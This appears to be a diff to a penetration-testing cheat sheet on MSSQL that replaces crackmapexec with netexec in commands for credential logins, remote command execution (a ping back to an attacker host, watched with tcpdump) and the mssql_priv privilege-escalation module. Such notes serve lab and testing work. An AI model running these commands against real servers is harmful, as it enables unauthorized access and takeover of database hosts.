@@ -5,16 +5,16 @@ sqsh -S $TARGET_IP:$PORT -U $TARGET_AD\\$USER -P $PASS
 ```
 
 ```shell
-crackmapexec mssql $TARGET_IP -u $USER -p $PASSWORD
+netexec mssql $TARGET_IP -u $USER -p $PASSWORD
 ```
 
 ```shell
-crackmapexec mssql --local-auth $TARGET_IP -u $USER -p $PASSWORD -L
+netexec mssql --local-auth $TARGET_IP -u $USER -p $PASSWORD -L
 ```
 
 Try to execute command on server:
 ```shell
-crackmapexec mssql --local-auth $TARGET_IP -u $USER -p $PASSWORD -x 'ping $ATTACKER'
+netexec mssql --local-auth $TARGET_IP -u $USER -p $PASSWORD -x 'ping $ATTACKER'
 ```
 and on attacker box:
 ```shell
@@ -24,7 +24,7 @@ sudo tcpdump -i tun0 icmp -n
 Try to start mssql_priv:
 
 ```shell
-crackmapexec mssql --local-auth $TARGET_IP -u $USER -p $PASSWORD -M mssql_priv
+netexec mssql --local-auth $TARGET_IP -u $USER -p $PASSWORD -M mssql_priv
 ```
 
 One client is mssqlclient.py:
